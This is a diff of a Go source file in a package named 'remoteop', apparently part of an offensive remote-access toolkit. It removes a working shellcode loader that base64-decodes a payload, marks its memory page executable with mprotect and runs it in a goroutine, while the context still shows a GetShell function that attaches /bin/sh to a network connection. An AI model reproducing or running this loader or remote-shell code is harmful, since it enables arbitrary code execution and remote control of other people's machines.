@@ -3,14 +3,11 @@
 package remoteop
 
 import (
-	"encoding/base64"
 	"fmt"
-	"golang.org/x/sys/unix"
 	"io"
 	"log"
 	"net"
 	"os/exec"
-	"unsafe"
 )
 
 // GetShell returns an *exec.Cmd instance which will run /bin/sh
@@ -53,32 +50,4 @@ func GetShell(conn net.Conn) {
 	default:
 		return
 	}
-}
-
-// InjectShellcode decodes base64 encoded shellcode
-// and injects it in the same process.
-func InjectShellcode(encShellcode string) {
-	if encShellcode != "" {
-		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
-			execShellcode(shellcode)
-		}
-	}
-	return
-}
-
-// Get the page containing the given pointer
-// as a byte slice.
-func getPage(p uintptr) []byte {
-	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(unix.Getpagesize()-1))))[:unix.Getpagesize()]
-}
-
-// ExecShellcode sets the memory page containing the shellcode
-// to R-X, then executes the shellcode as a function.
-func execShellcode(shellcode []byte) {
-	shellcodeAddr := uintptr(unsafe.Pointer(&shellcode[0]))
-	page := getPage(shellcodeAddr)
-	_ = unix.Mprotect(page, unix.PROT_READ|unix.PROT_EXEC)
-	shellPtr := unsafe.Pointer(&shellcode)
-	shellcodeFuncPtr := *(*func())(unsafe.Pointer(&shellPtr))
-	go shellcodeFuncPtr()
 }
